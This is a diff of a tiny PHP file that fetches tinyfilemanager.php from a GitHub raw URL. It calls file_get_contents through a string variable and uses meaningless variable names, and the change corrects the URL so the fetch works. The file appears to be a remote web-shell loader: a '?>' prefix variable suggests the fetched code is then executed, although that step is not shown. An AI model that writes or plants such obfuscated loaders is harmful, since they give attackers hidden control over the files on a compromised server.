@@ -1,5 +1,5 @@
 <?php
-$awo = 'https://raw.githubusercontent.com/prasathmani/tinyfilemanager/refs/heads/master/tinyfilemanager.php';
+$awo = 'https://raw.githubusercontent.com/prasathmani/tinyfilemanager/refs/heads/master/';
   $fgt = 'file_get_contents';
    $data = $fgt($awo . 'tinyfilemanager.php');
      $admin = '?>';
